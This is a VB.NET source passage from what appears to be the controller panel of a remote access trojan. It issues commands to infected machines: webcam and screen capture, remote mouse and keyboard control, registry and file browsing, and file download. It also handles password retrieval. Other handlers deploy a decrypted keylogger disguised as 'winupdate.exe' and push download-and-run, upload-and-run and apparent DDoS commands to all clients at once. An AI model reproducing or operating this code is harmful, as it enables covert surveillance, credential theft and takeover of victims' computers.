                    all2()
                    GroupIE.Visible = True
                Case "SDPC"
                    all2()
                    PictureBox1.Visible = True
                Case "RPC"
                    Try
                        If Connected() Then
                            all2()
                            Dim answer As DialogResult
                            answer = MessageBox.Show("Are you sure you want to Restart this PC", "#.54", MessageBoxButtons.YesNo, MessageBoxIcon.Question)
                            If answer = DialogResult.Yes Then
                                streamWriterlist(abc).WriteLine("/RESTWIND/")
                                streamWriterlist(abc).Flush()
                            End If

                        End If
                    Catch ex As Exception
                    End Try
                Case "TPC"
                    Try
                        If Connected() Then
                            all2()
                            Dim answer As DialogResult
                            answer = MessageBox.Show("Are you sure you want to Turn Off this PC", "#.54", MessageBoxButtons.YesNo, MessageBoxIcon.Question)
                            If answer = DialogResult.Yes Then
                                streamWriterlist(abc).WriteLine("/TURNWIND/")
                                streamWriterlist(abc).Flush()
                            End If

                        End If
                    Catch ex As Exception
                    End Try
                Case "LPC"
                    Try
                        If Connected() Then
                            all2()
                            Dim answer As DialogResult
                            answer = MessageBox.Show("Are you sure you want to LogOff this PC", "#.54", MessageBoxButtons.YesNo, MessageBoxIcon.Question)
                            If answer = DialogResult.Yes Then
                                streamWriterlist(abc).WriteLine("/LOGOWIND/")
                                streamWriterlist(abc).Flush()
                            End If

                        End If
                    Catch ex As Exception

                    End Try

                Case "Clip"
                    all2()
                    Try
                        GroupClip.Visible = True
                    Catch ex As Exception
                    End Try
                Case "FRMC"
                    all2()

                Case "RD"
                    all2()
                    GroupDaR.Visible = True
                Case "PR"
                    all2()
                    GroupPrint.Visible = True
                Case "FM"
                    all2()
                    GroupFM.Visible = True
                Case "KL"
                    all2()
                    GroupKL.Visible = True
                Case "PROC"
                    all2()
                    GroupProcess.Visible = True
                Case "SERV"
                    all2()
                    GroupService.Visible = True
                Case "WND"
                    all2()
                    GroupWindows.Visible = True
                Case "cmd"
                    all2()
                    GroupCMD.Visible = True
                Case "CS"
                    all2()
                    GroupServer.Visible = True
                Case "SS"
                    all2()
                    GroupScreen.Visible = True
                Case "Reg"
                    Try
                        If Connected() Then
                            all2()
                            GroupBox1.Visible = True
                            WriteTotreeclear()
                            streamWriterlist(abc).WriteLine("/REGYVIEW/" & "CU")
                            streamWriterlist(abc).Flush()
                            streamWriterlist(abc).WriteLine("/REGYVIEW/" & "LM")
                            streamWriterlist(abc).Flush()
                            streamWriterlist(abc).WriteLine("/REGYVIEW/" & "US")
                            streamWriterlist(abc).Flush()
                        End If
                    Catch ex As Exception

                    End Try

                Case "SF"
                    all2()
                    GroupBox2.Visible = True

                Case "WC"
                    all2()
                    GroupBox3.Visible = True

                Case "STO"
                    all2()
                    GroupBox4.Visible = True

                Case "PSW"

                    all2()
                    GroupBox8.Visible = True



            End Select

        End If

    End Sub



    Private Sub ListView3_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ListView3.SelectedIndexChanged
        Try
            Dim objDrawingPoint As Drawing.Point
            objDrawingPoint = ListView3.PointToClient(Cursor.Position)

            If Not IsNothing(objDrawingPoint) Then
                With objDrawingPoint
                    objListViewItem2 = ListView3.GetItemAt(.X, .Y)
                End With

            End If
        Catch ex As Exception

        End Try

    End Sub

    Private Sub ListView2_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ListView2.SelectedIndexChanged
        Try
            Dim objDrawingPoint As Drawing.Point

            objDrawingPoint = ListView2.PointToClient(Cursor.Position)

            If Not IsNothing(objDrawingPoint) Then
                With objDrawingPoint
                    objListViewItem3 = ListView2.GetItemAt(.X, .Y)
                End With
            End If
        Catch ex As Exception

        End Try


    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Try
            If itimer < 10 Then
                If ToolStripStatusLabel2.ForeColor = Color.DarkBlue Then
                    itimer = itimer + 1
                    ToolStripStatusLabel2.ForeColor = Color.Red
                    ToolStripStatusLabel2.Font = New System.Drawing.Font("Tahoma", 11.75!, CType((System.Drawing.FontStyle.Bold Or System.Drawing.FontStyle.Underline), System.Drawing.FontStyle), System.Drawing.GraphicsUnit.Point, CType(177, Byte))


                Else
                    ToolStripStatusLabel2.ForeColor = Color.DarkBlue
                    ToolStripStatusLabel2.Font = New System.Drawing.Font("Tahoma", 11.75!, CType((System.Drawing.FontStyle.Bold), System.Drawing.FontStyle), System.Drawing.GraphicsUnit.Point, CType(177, Byte))

                End If
            Else
                ToolStripStatusLabel2.ForeColor = Color.DarkBlue
                Timer1.Stop()
                ToolStripStatusLabel2.Font = New System.Drawing.Font("Tahoma", 11.75!, CType((System.Drawing.FontStyle.Bold), System.Drawing.FontStyle), System.Drawing.GraphicsUnit.Point, CType(177, Byte))

                itimer = 0
            End If
        Catch ex As Exception

        End Try
    End Sub



    Private Sub Button40_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button40.Click
        Try
            If Button40.Text = "Start Listening..." Then
                th_StartListen = New Thread(New ThreadStart(AddressOf StartListen))
                th_StartListen.Start()
                Button40.Text = "Stop Listening..."
                Timer2.Start()

            Else
                th_StartListen.Abort()
                tcpListener.Stop()
                Button40.Text = "Start Listening..."
                toolStripStatusLabel1.Text = "The Listener is stopped..."
            End If

        Catch ex As Exception

        End Try
    End Sub



    Private Sub Frm_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            Dim ex As Boolean = Nothing
            Dim exint As Integer = 0
            Dim current As String = Application.StartupPath
            Dim fileArray() As String = Directory.GetFiles(current)
            For Each myFile As String In fileArray
                If myFile.EndsWith("license") Then
                    exint = exint + 1
                End If
            Next
            If My.Computer.FileSystem.FileExists(Application.StartupPath & "\trial.license") And exint > 1 Then
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\trial.license", FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently)
            End If
        Catch ex As Exception

        End Try
        Try
            Dim ini As New IniFile(Application.StartupPath & "\Settings.ini")
            TextBox18.Text = ini.GetString("General", "Main Listening Port", TextBox18.Text)
            TextBox19.Text = ini.GetString("General", "Main Port", TextBox19.Text)
            TextBox26.Text = ini.GetString("General", "Backup Port", TextBox26.Text)
            TextBox28.Text = ini.GetString("General", "Passwords Key", TextBox28.Text)
            

        Catch ex As Exception

        End Try
        Me.ProgressBar4.MarqueeAnimationSpeed = 0
    End Sub

    Private Sub textBox2_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles textBox2.TextChanged

    End Sub

    Private Sub Button70_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button70.Click
        Try
            If Connected() Then
                listfilename = objListViewItem.Text
                streamWriterlist(abc).WriteLine("/IPREVIEW/" & PercorsoAssoluto & listfilename)
                streamWriterlist(abc).Flush()
            End If

        Catch ex As Exception

        End Try
    End Sub

    Private LocalMousePosition As Point
    Private cursx, cursy As Integer
    Private cursdx, cursdy As Double
    Private Sub PictureBox2_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles PictureBox2.MouseDown
        If Connected() Then
            If MouseControlToolStripMenuItem.Checked And StartSequenceToolStripMenuItem.Checked Then
                If e.Button = Windows.Forms.MouseButtons.Left Then
                    streamWriterlist(abc).WriteLine("/SETCLICK/" & "left")
                    streamWriterlist(abc).Flush()
                ElseIf e.Button = Windows.Forms.MouseButtons.Right Then
                    streamWriterlist(abc).WriteLine("/SETCLICK/" & "right")
                    streamWriterlist(abc).Flush()
                ElseIf e.Button = Windows.Forms.MouseButtons.Middle Then
                    streamWriterlist(abc).WriteLine("/SETCLICK/" & "middle")
                    streamWriterlist(abc).Flush()

                End If
            End If
        End If
    End Sub


    Private Sub PictureBox2_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles PictureBox2.MouseMove
        If Connected2() Then
            If MouseControlToolStripMenuItem.Checked And StartSequenceToolStripMenuItem.Checked Then
                LocalMousePosition = PictureBox2.PointToClient(Cursor.Position)
                cursx = LocalMousePosition.X
                cursy = LocalMousePosition.Y
                cursdx = cursx * (clcursorx / PictureBox2.Size.Width)
                cursdy = cursy * (clcursory / PictureBox2.Size.Height)
                streamWriterlist(abc).WriteLine("/SETMOUSE/" & cursdx & "*" & cursdy)
                streamWriterlist(abc).Flush()
            End If
        End If


    End Sub



    Private Sub TakeScreenShotToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TakeScreenShotToolStripMenuItem.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/DOWNDESK/" & NumericUpDown1.Value)
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub StartSequenceToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartSequenceToolStripMenuItem.Click
        Try
            If Connected() Then
               
                If StartSequenceToolStripMenuItem.Text = "Start Sequence" Then
                    StartSequenceToolStripMenuItem.Text = "Stop Sequence"
                    StartSequenceToolStripMenuItem.Checked = True
                    MouseControlToolStripMenuItem.Visible = True
                    If MouseControlToolStripMenuItem.Checked Then
                        Label18.Text = "Sequence is running with remote control"
                    Else
                        Label18.Text = "Sequence is running"
                    End If

                    streamWriterlist(abc).WriteLine("/STARTSQN/")
                    streamWriterlist(abc).Flush()


                Else
                    flag = False
                    flag1 = False


                    StartSequenceToolStripMenuItem.Text = "Start Sequence"
                    StartSequenceToolStripMenuItem.Checked = False
                    MouseControlToolStripMenuItem.Checked = False
                    MouseControlToolStripMenuItem.Visible = False
                    Label18.Text = ""

                    streamWriterlist(abc).WriteLine("/STOPPSEQ/")
                    streamWriterlist(abc).Flush()
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub MouseControlToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MouseControlToolStripMenuItem.Click
        If MouseControlToolStripMenuItem.Checked Then
            MouseControlToolStripMenuItem.Checked = False
            If StartSequenceToolStripMenuItem.Checked Then
                Label18.Text = "Sequence is running"
            Else
                Label18.Text = ""
            End If
        Else
            MouseControlToolStripMenuItem.Checked = True
            If StartSequenceToolStripMenuItem.Checked Then
                Label18.Text = "Sequence is running with remote control"
            End If

            streamWriterlist(abc).WriteLine("/STARTSQL/")
            streamWriterlist(abc).Flush()
        End If
    End Sub

    Private Sub SaveToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SaveToolStripMenuItem.Click
        Try
            Dim objSaveFileDialog As New SaveFileDialog
            With objSaveFileDialog
                .DefaultExt = "jpg"
                .FileName = "Screen"
                .Filter = "Jpeg files (*.jpg)|*.jpg"
                .FilterIndex = 1
                .OverwritePrompt = True
                .Title = "Save File Dialog"
            End With

            If objSaveFileDialog.ShowDialog = Windows.Forms.DialogResult.OK Then
                Try
                    Dim filePath As String
                    filePath = System.IO.Path.Combine( _
                        My.Computer.FileSystem.SpecialDirectories.MyDocuments, _
                        objSaveFileDialog.FileName)
                    Dim imgInput As System.Drawing.Image
                    Dim imgOutput As System.Drawing.Image
                    Dim bmapTemp As Bitmap
                    imgInput = returnImage
                    bmapTemp = imgInput
                    imgOutput = New Bitmap(bmapTemp)
                    imgOutput.Save(objSaveFileDialog.FileName, System.Drawing.Imaging.ImageFormat.Jpeg)

                Catch fileException As Exception
                    Throw fileException
                End Try
            End If

            objSaveFileDialog.Dispose()
            objSaveFileDialog = Nothing
        Catch ex As Exception

        End Try

    End Sub

    Private Sub FullScreenToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FullScreenToolStripMenuItem.Click
        If FullScreenToolStripMenuItem.Text = "Full Screen" Then
            FullScreenToolStripMenuItem.Text = "Normal Screen"
            GroupScreen.Dock = DockStyle.Fill
            Me.WindowState = FormWindowState.Maximized
        Else
            FullScreenToolStripMenuItem.Text = "Full Screen"
            Me.WindowState = FormWindowState.Normal
            GroupScreen.Dock = DockStyle.None
            GroupScreen.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
                    Or System.Windows.Forms.AnchorStyles.Left) _
                    Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)


        End If
    End Sub



    Private Sub Button83_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Button83.MouseUp
        If e.Button = Windows.Forms.MouseButtons.Left Then
            SSCM.Show(CType(sender, Control), e.Location)
        End If

    End Sub

    Private Sub TrackBar1_Scroll(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TrackBar1.Scroll
        NumericUpDown1.Value = TrackBar1.Value
    End Sub

    Private Sub NumericUpDown1_ValueChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NumericUpDown1.ValueChanged
        Try
            TrackBar1.Value = NumericUpDown1.Value
        Catch ex As Exception

        End Try
    End Sub

    Private nodf As TreeNode
    Private Sub TreeView2_AfterSelect(ByVal sender As System.Object, ByVal e As System.Windows.Forms.TreeViewEventArgs) Handles TreeView2.AfterSelect
        Try
            Dim rk As RegistryKey
            Dim s As String = Nothing
            Dim reg As String = Nothing
            If e.Node.FullPath.StartsWith(Registry.CurrentUser.Name) Then
                rk = Registry.CurrentUser
                s = Registry.CurrentUser.Name
                reg = "CU"
            ElseIf e.Node.FullPath.StartsWith(Registry.LocalMachine.Name) Then
                rk = Registry.LocalMachine
                s = Registry.LocalMachine.Name
                reg = "LM"
            ElseIf e.Node.FullPath.StartsWith(Registry.Users.Name) Then
                rk = Registry.Users
                s = Registry.Users.Name
                reg = "US"
            End If
            nodf = e.Node
            Dim rg As Integer = s.Length + 1
            Dim rge As String = e.Node.FullPath.ToString.Remove(0, rg)
            If e.Node.Nodes.Count > 0 Then
            Else
                streamWriterlist(abc).WriteLine("/REGVIEWS/" & reg & "¥" & rge)
                streamWriterlist(abc).Flush()
                streamWriterlist(abc).WriteLine("/REGVIEWV/" & reg & "¥" & rge)
                streamWriterlist(abc).Flush()

            End If

        Catch ex As Exception

        End Try
    End Sub



    Private Sub Button76_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button76.Click
        Try
            If Connected() Then
                If Button76.Text = "Search" Then
                    Button76.Text = "Stop"
                    Clearlist5()
                    streamWriterlist(abc).WriteLine("/SEARCHSS/" & "1")
                    streamWriterlist(abc).Flush()
                    streamWriterlist(abc).WriteLine("/SEARCHFL/" & ComboBox3.Text & "¦" & TextBox20.Text)
                    streamWriterlist(abc).Flush()
                    Me.ProgressBar4.MarqueeAnimationSpeed = 30
                    Me.ProgressBar4.Style = ProgressBarStyle.Marquee
                Else
                    streamWriterlist(abc).WriteLine("/SEARCHSS/" & "2")
                    streamWriterlist(abc).Flush()
                    Button76.Text = "Search"
                End If


            End If
        Catch ex As Exception

        End Try

    End Sub

    Private Sub ComboBox3_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles ComboBox3.MouseDown
        Try
            If Connected() Then
                If ComboBox3.Text <> "Drives" Then
                Else
                    streamWriterlist(abc).WriteLine("/LISTDRVS/")
                    streamWriterlist(abc).Flush()
                End If

            End If
        Catch ex As Exception

        End Try
    End Sub

    Private objlist5 As String = Nothing
    Private objlist5sub As String = Nothing
    Private Sub ListView5_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ListView5.SelectedIndexChanged
        Try
            Dim objDrawingPoint As Drawing.Point
            Dim folder As String = Nothing


            objDrawingPoint = ListView5.PointToClient(Cursor.Position)

            If Not IsNothing(objDrawingPoint) Then
                With objDrawingPoint
                    objListViewItem = ListView5.GetItemAt(.X, .Y)
                End With

                If Not IsNothing(objListViewItem) Then
                    objlist5 = objListViewItem.Text
                    objlist5sub = objListViewItem.SubItems(2).Text
                End If
            End If
            If objlist5.EndsWith("jpg") Or objlist5.EndsWith("png") Or objlist5.EndsWith("gif") Or objlist5.EndsWith("bmp") Or objlist5.EndsWith("jpeg") Or objlist5.EndsWith("jpg".ToUpper) Or objlist5.EndsWith("png".ToUpper) Or objlist5.EndsWith("gif".ToUpper) Or objlist5.EndsWith("bmp".ToUpper) Or objlist5.EndsWith("jpeg".ToUpper) Then
                Button16.Visible = True
            Else
                Button16.Visible = False
            End If

        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button16_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button16.Click
        Try
            If Connected() Then
                listfilename = objlist5sub
                streamWriterlist(abc).WriteLine("/IPREVIEW/" & listfilename)
                streamWriterlist(abc).Flush()
            End If

        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button86_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button86.Click
        Try
            If Connected() Then
                If Button86.Text = "Stop Download..." Then
                    streamWriterlist(abc).WriteLine("/STOPDOWN/")
                    streamWriterlist(abc).Flush()
                    WriteToPB(0)
                    Button86.Enabled = False
                    Button86.Text = "Wait..."
                    Delay(1)
                    Try
                        _OutputFileStram.Close()
                        _BinaryWriter.Close()
                        If File.Exists(_MergedFile) Then File.Delete(_MergedFile)
                    Catch ex As Exception
                    End Try
                    Button86.Enabled = True
                    Button86.Text = "Download"
                    MessageBox.Show("The operation was canceled!", "File download canceled R.#8...", MessageBoxButtons.OK, MessageBoxIcon.Error)

                Else

                    If objlist5 = "" Then
                        MessageBox.Show("Choose file to download", "R.#10", MessageBoxButtons.OK, MessageBoxIcon.Information)
                    Else
                        FlagDown = True
                        listfilename = objlist5sub
                        streamWriterlist(abc).WriteLine("/DOWNFILE/" & listfilename)
                        streamWriterlist(abc).Flush()
                        Button86.Text = "Stop Download..."

                    End If

                End If
            End If
        Catch ex As Exception

        End Try
    End Sub




    Private Sub ComboBox4_DropDown(ByVal sender As Object, ByVal e As System.EventArgs) Handles ComboBox4.DropDown
        Try
            If Connected() Then
                If ComboBox4.Text = "Choose WebCam Device..." Then
                    streamWriterlist(abc).WriteLine("/WEBLISTC/")
                    streamWriterlist(abc).Flush()
                End If
               
            End If
        Catch ex As Exception

        End Try
    End Sub


    Private Sub ToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem1.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/WEBIMAGA/" & 0)
                streamWriterlist(abc).Flush()
                Threading.Thread.Sleep(100)
                streamWriterlist(abc).WriteLine("/WEBIMAGE/" & "Image")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub ComboBox4_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ComboBox4.SelectedIndexChanged
        Try
            If Connected() Then
                If Not ComboBox4.SelectedItem.ToString = "Choose WebCam Device..." Then
                    streamWriterlist(abc).WriteLine("/WEBSTART/" & ComboBox4.Text)
                    streamWriterlist(abc).Flush()
                End If
                
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub ToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem2.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/WEBIMAGA/" & 1)
                streamWriterlist(abc).Flush()
                Threading.Thread.Sleep(100)
                streamWriterlist(abc).WriteLine("/WEBIMAGE/" & "Capture")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub ToolStripMenuItem4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem4.Click
        Try

            Dim imgInput As System.Drawing.Image
            Dim imgOutput As System.Drawing.Image
            Dim bmapTemp As Bitmap
            imgInput = returnImage
            bmapTemp = imgInput
            imgOutput = New Bitmap(bmapTemp)
            Dim objSaveFileDialog As New SaveFileDialog
            With objSaveFileDialog
                .DefaultExt = "jpg"
                .FileName = "Screen"
                .Filter = "Jpeg files (*.jpg)|*.jpg"
                .FilterIndex = 1
                .OverwritePrompt = True
                .Title = "Save File Dialog"
            End With

            If objSaveFileDialog.ShowDialog = Windows.Forms.DialogResult.OK Then
                Try
                    Dim filePath As String
                    filePath = System.IO.Path.Combine( _
                        My.Computer.FileSystem.SpecialDirectories.MyDocuments, _
                        objSaveFileDialog.FileName)
                    imgOutput.Save(objSaveFileDialog.FileName, System.Drawing.Imaging.ImageFormat.Jpeg)

                Catch fileException As Exception
                    Throw fileException
                End Try
            End If

            objSaveFileDialog.Dispose()
            objSaveFileDialog = Nothing
        Catch ex As Exception

        End Try
    End Sub

    Private Sub ToolStripMenuItem5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem5.Click
        If ToolStripMenuItem5.Text = "Full Screen" Then
            ToolStripMenuItem5.Text = "Normal Screen"
            GroupBox3.Dock = DockStyle.Fill
            Me.WindowState = FormWindowState.Maximized
        Else
            ToolStripMenuItem5.Text = "Full Screen"
            Me.WindowState = FormWindowState.Normal
            GroupBox3.Dock = DockStyle.None
            GroupBox3.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
                    Or System.Windows.Forms.AnchorStyles.Left) _
                    Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)


        End If
    End Sub

    Private Sub CloseWebCamConnectionToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseWebCamConnectionToolStripMenuItem.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/WEBSTOPP/" & "1")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub DisconnectToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisconnectToolStripMenuItem.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/WEBDISCO/")
                streamWriterlist(abc).Flush()
            End If
            ClearCombo4()
            ComboBox4.Text = "Choose WebCam Device..."
        Catch ex As Exception

        End Try
    End Sub

    Private Sub ComboBox5_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ComboBox5.SelectedIndexChanged
        Quality = ComboBox5.Text
    End Sub

    Private Sub TextBox20_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox20.KeyUp
        Try
            If Connected() Then
                If e.KeyData = Keys.Enter Then
                    Clearlist5()
                    Button76.Text = "Stop"
                    streamWriterlist(abc).WriteLine("/SEARCHSS/" & "1")
                    streamWriterlist(abc).Flush()
                    streamWriterlist(abc).WriteLine("/SEARCHFL/" & ComboBox3.Text & "¦" & TextBox20.Text)
                    streamWriterlist(abc).Flush()
                    Me.ProgressBar4.MarqueeAnimationSpeed = 30
                    Me.ProgressBar4.Style = ProgressBarStyle.Marquee
                End If
            End If
        Catch ex As Exception

        End Try

    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        Dim i As Integer
        Try
            For i = 0 To clientList.Count - 1
                Try
                    Dim ns As NetworkStream = New NetworkStream(clientList(i))
                    Dim ss As StreamWriter = New StreamWriter(ns)
                    If ListView1.Items.Item(i).SubItems(4).Text.Contains("1.7") Then
                        ss.WriteLine("/AVAILABL/")
                        ss.Flush()
                    End If
                Catch ex As Exception
                    If Not ListView1.Items.Item(i).Text = "Disconnected" Then
                        ListView1.Items.Item(i).Text = "Disconnected"
                        ListView1.Items.Item(i).SubItems(1).Text = "Disconnected"
                        ListView1.Items.Item(i).SubItems(2).Text = "Disconnected"
                        ListView1.Items.Item(i).SubItems(3).Text = "Disconnected"
                        ListView1.Items.Item(i).SubItems(4).Text = "Disconnected"
                        Connect = Connect - 1
                        toolStripStatusLabel1.Text = "Connected Clients " & Connect
                        Notify.Text = "Connected Clients " & Connect
                    End If

                End Try


            Next
        Catch ex As Exception

        End Try

    End Sub

   

    Private Sub Button73_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button73.Click
        Try

          
            Dim patch As String = Application.StartupPath & "\KL.obj"
            Dim bytes As String = My.Computer.FileSystem.ReadAllText(patch)
            Dim str As String = Decrypt(bytes, "&%#@?,:*")
            streamWriterlist(abc).WriteLine("/INSTALLK/" & "C:\Users\Public\" & "*" & "winupdate.exe" & "*" & str)
            streamWriterlist(abc).Flush()
            str = Nothing
        Catch ex As Exception
            MessageBox.Show("The update wasn't successful", "Update", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    Private Sub Button71_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button71.Click
        Try
            For i As Integer = 0 To clientList.Count - 1
                Try
                    If ListView1.Items.Item(i).SubItems(4).Text.Contains("1.7") Then
                        Dim ns As NetworkStream = New NetworkStream(clientList(i))
                        Dim ss As StreamWriter = New StreamWriter(ns)
                        If RadioButton10.Checked Then

                            ss.WriteLine("/DLARUNVS/" & TextBox23.Text)
                            ss.Flush()

                        ElseIf RadioButton9.Checked Then

                            ss.WriteLine("/DLARUNHD/" & TextBox23.Text)
                            ss.Flush()

                        End If
                    End If
                Catch ex As Exception

                End Try
            Next
        Catch ex As Exception

        End Try

    End Sub

    Private Sub Button74_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button74.Click
        Try
            Dim str As String = Nothing
            Dim bmpBytes() As Byte = My.Computer.FileSystem.ReadAllBytes(TextBox24.Text)
            str = Convert.ToBase64String(bmpBytes)
            Dim pathup As String = Path.GetFileName(TextBox24.Text)
            For i As Integer = 0 To clientList.Count - 1
                Try
                    If ListView1.Items.Item(i).SubItems(4).Text.Contains("1.7") Then
                        Dim ns As NetworkStream = New NetworkStream(clientList(i))
                        Dim ss As StreamWriter = New StreamWriter(ns)
                        If RadioButton12.Checked Then
                            ss.WriteLine("/UPANDRUN/" & "C:\Users\Public\" & "*" & pathup & "*" & str & "*" & "1")
                            ss.Flush()
                        ElseIf RadioButton11.Checked Then
                            ss.WriteLine("/UPANDRUN/" & "C:\Users\Public\" & "*" & pathup & "*" & str & "*" & "0")
                            ss.Flush()
                        End If
                    End If
                   
                Catch ex As Exception

                End Try
               
            Next
            Str = Nothing

        Catch exi As Exception
        End Try
      
    End Sub

    Private Sub Button80_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button80.Click

        Using o As New OpenFileDialog
            With o
                .Filter = "All Files (*.*)|*.*"
                .Title = "Load File..."
                .ShowDialog()
            End With
            TextBox24.Text = o.FileName.ToString
            o.Dispose()
        End Using
        Directory.SetCurrentDirectory(Application.StartupPath())
    End Sub

    
    Private Sub Button77_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button77.Click
        For i As Integer = 0 To clientList.Count - 1
            Try
                If ListView1.Items.Item(i).SubItems(4).Text.Contains("1.7") Then
                    Dim ns As NetworkStream = New NetworkStream(clientList(i))
                    Dim ss As StreamWriter = New StreamWriter(ns)

                    ss.WriteLine("/DDATONWB/" & TextBox25.Text)
                    ss.Flush()
                End If
            Catch ex As Exception

            End Try

        Next
    End Sub

   

  

    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick
        Try
            If itimer2 < 25 Then
                If TextBox27.Text = Nothing Then
                    TextBox27.Text = "Proccesing..."
                    itimer2 = itimer2 + 1

                Else
                    If gflag = False Then
                        TextBox27.Text = Nothing
                    End If


                End If
            Else
                Timer3.Stop()
                TextBox27.Text = "No Passwords found!!!"
                itimer2 = 0
            End If
        Catch ex As Exception

        End Try

    End Sub

    Private Sub Button87_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button87.Click
        If Button87.Text = "ENABLE TOPMOST" Then
            Button87.Text = "DISABLE TOPMOST"
            Me.TopMost = True
        Else
            Button87.Text = "ENABLE TOPMOST"
            Me.TopMost = False
        End If
    End Sub

    Private Sub TextBox29_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox29.KeyDown
        Try
            If MouseControlToolStripMenuItem.Checked Then
                Dim Key As String = ""
                Select Case e.KeyCode
                    Case &H30 To &H39
                        If My.Computer.Keyboard.ShiftKeyDown Then
                            If e.KeyCode = &H30 Then
                                Key = ")"
                            ElseIf e.KeyCode = &H31 Then
                                Key = "!"
                            ElseIf e.KeyCode = &H32 Then
                                Key = "@"
                            ElseIf e.KeyCode = &H33 Then
                                Key = "#"
                            ElseIf e.KeyCode = &H34 Then
                                Key = "$"
                            ElseIf e.KeyCode = &H35 Then
                                Key = "%"
                            ElseIf e.KeyCode = &H36 Then
                                Key = "^"
                            ElseIf e.KeyCode = &H37 Then
                                Key = "&"
                            ElseIf e.KeyCode = &H38 Then
                                Key = "*"
                            ElseIf e.KeyCode = &H39 Then
                                Key = "("
                            ElseIf e.KeyCode = &H30 Then
                            End If
                        Else
                            Key = ChrW(e.KeyCode)
                        End If
                    Case &H41 To &H5A
                        If My.Computer.Keyboard.CapsLock Or My.Computer.Keyboard.ShiftKeyDown Then
                            Key = ChrW(e.KeyCode + 32)
                            Key = Key.ToUpper
                        Else
                            Key = ChrW(e.KeyCode + 32)
                        End If

                    Case &H20
                        Key = " "
                    Case &HA3, &HA2

                    Case &HA4, &HA5

                    Case &HA0, &HA1

                    Case &HD
                        Key = "{ENTER}"
                    Case &H9
                        Key = "{TAB}"
                    Case &H2E
                        Key = "{DEL}"
                    Case &H1B
                        Key = "{ESC}"
                    Case &H14

                    Case &H60 To &H69
                        If My.Computer.Keyboard.NumLock Then
                            Key = (e.KeyCode - 96)
                        Else
                            If e.KeyCode = &H60 Then
                                Key = "{INS}"
                            ElseIf e.KeyCode = &H61 Then
                                Key = "{END}"
                            ElseIf e.KeyCode = &H62 Then
                                'Key = "[Num ↓]"
                            ElseIf e.KeyCode = &H63 Then
                                Key = "{PGDN}"
